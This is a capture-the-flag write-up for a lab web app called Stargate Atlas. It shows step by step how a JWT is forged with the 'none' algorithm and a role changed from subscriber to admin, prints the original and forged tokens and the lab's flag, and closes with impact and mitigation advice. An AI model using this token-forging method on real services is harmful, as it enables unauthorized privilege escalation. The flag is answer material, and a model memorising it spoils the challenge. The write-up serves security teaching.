# Stargate Atlas — JWT `alg: none` Privilege Escalation

## Overview

Stargate Atlas is a spaceflight-tracking web application that provides launch schedules, mission archives, and subscriber-only telemetry data. The application uses JSON Web Tokens (JWTs) for authentication and authorization.

The objective of the challenge was to obtain administrator privileges and access the protected `/admin/manifests` section.

The vulnerability was caused by improper JWT validation. The application accepted JWTs using the `none` algorithm, which means that the token did not require a cryptographic signature. Because the server trusted the claims inside the modified token, it was possible to change the user's role from `subscriber` to `admin` and gain administrative access.

## Reconnaissance

I started by opening the Stargate Atlas lab and registering a new account. After registration, I logged into the application normally.

Once logged in, I opened the browser's Developer Tools and inspected the application's cookies. I found a cookie containing a JWT.

The token had the standard JWT structure:

```text
HEADER.PAYLOAD.SIGNATURE
```

The original token was:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjaG9kQGdtYWlsLmNvbSIsInJvbGUiOiJzdWJzY3JpYmVyIiwiaWF0IjoxNzg2MjE0MzY5LCJleHAiOjE3ODYyMTc5Njl9.k6eaZlI_dnkfqq5RcaM6h29nm7SjZKA5gni1FTec3Ig
```

A JWT consists of three Base64URL-encoded sections separated by periods.

## Examining the JWT Header

I decoded the first section of the token and found:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The `alg` value showed that the application was using the HS256 signing algorithm.

## Examining the JWT Payload

I then decoded the second section of the JWT.

The payload contained:

```json
{
  "sub": "chod@gmail.com",
  "role": "subscriber",
  "iat": 1786214369,
  "exp": 1786217969
}
```

The important value was the `role` claim:

```text
"role": "subscriber"
```

This indicated that the server was using information inside the JWT to determine the user's privilege level.

The `sub` value identified the user, while `iat` represented the time the token was issued and `exp` represented its expiration time.

## Testing the JWT Algorithm

The challenge description indicated that the application incorrectly accepted JWTs using the `none` algorithm.

I therefore modified the JWT header from:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

to:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The `none` algorithm represents an unsigned JWT. A properly configured application should reject such a token when authentication requires a cryptographic signature.

## Modifying the User Role

Next, I modified the payload.

The original payload contained:

```json
{
  "sub": "chod@gmail.com",
  "role": "subscriber",
  "iat": 1786214369,
  "exp": 1786217969
}
```

I changed the role from:

```text
subscriber
```

to:

```text
admin
```

The modified payload became:

```json
{
  "sub": "chod@gmail.com",
  "role": "admin",
  "iat": 1786214369,
  "exp": 1786217969
}
```

I then Base64URL-encoded the modified header and payload.

Because JWT uses Base64URL encoding without padding, I removed the trailing `=` characters from the encoded sections.

## Removing the Signature

The original JWT contained a signature as its third section:

```text
HEADER.PAYLOAD.SIGNATURE
```

Since the header now specified:

```json
"alg": "none"
```

the forged JWT did not contain a signature.

Therefore, the final structure was:

```text
HEADER.PAYLOAD.
```

The final period was retained because it represents the separator between the payload and the now-empty signature section.

The forged token was:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJjaG9kQGdtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4NjIxNDM2OSwiZXhwIjoxNzg2MjE3OTY5fQ.
```

## Replacing the Authentication Cookie

I used the browser's Developer Tools to replace the original JWT stored in the authentication cookie with the forged JWT.

I then refreshed the application.

The application accepted the forged token and treated my account as an administrator.

This demonstrated that the server was trusting the modified JWT claims without properly verifying the token's cryptographic signature.

## Accessing the Protected Area

After the forged token was accepted, I accessed the administrative manifests section:

```text
/admin/manifests
```

The page was accessible with the newly obtained administrator privileges.

The flag displayed in the administrative section was:

```text
WEBVERSE{857f83021bce515d5167f65e3486d48b}
```

## Vulnerability

The vulnerability was a JWT authentication/authorization implementation flaw involving the `none` algorithm.

The application trusted the algorithm specified by the JWT and accepted an unsigned token. Because the signature was not required or verified, I could modify the JWT payload and change my role from:

```text
subscriber
```

to:

```text
admin
```

The application then trusted the forged role and granted administrative access.

This resulted in a privilege escalation and broken access control vulnerability.

## Impact

An attacker exploiting this vulnerability could potentially forge authentication tokens and impersonate users with higher privileges.

Depending on the application's functionality, this could allow an attacker to:

- Escalate from a normal user to an administrator.
- Access administrative functionality.
- Access protected or sensitive information.
- Bypass authorization controls.
- Potentially compromise other parts of the application that rely on the JWT for authorization.

## Mitigation

The application should never blindly trust the `alg` value supplied by an untrusted JWT.

The server should explicitly allow only the cryptographic algorithms it is configured to use, such as HS256, RS256, or another appropriate algorithm.

Every JWT should have its signature properly verified before any claims such as `role`, `permissions`, or `is_admin` are trusted.

The application should also use a mature and well-tested JWT library rather than implementing authentication and token validation from scratch.

## Conclusion

This challenge demonstrated how an improperly implemented JWT authentication system can lead to privilege escalation.

The important discovery was that the application accepted the `none` algorithm. By changing the JWT header from `HS256` to `none`, changing the `role` claim from `subscriber` to `admin`, removing the signature, and replacing the authentication cookie through Developer Tools, I was able to make the application recognize my account as an administrator.

I then accessed the protected `/admin/manifests` endpoint and retrieved the flag:

```text
WEBVERSE{857f83021bce515d5167f65e3486d48b}
```

The main lesson from the challenge is that JWT claims must never be trusted until the server has successfully validated the token's signature using an explicitly permitted algorithm.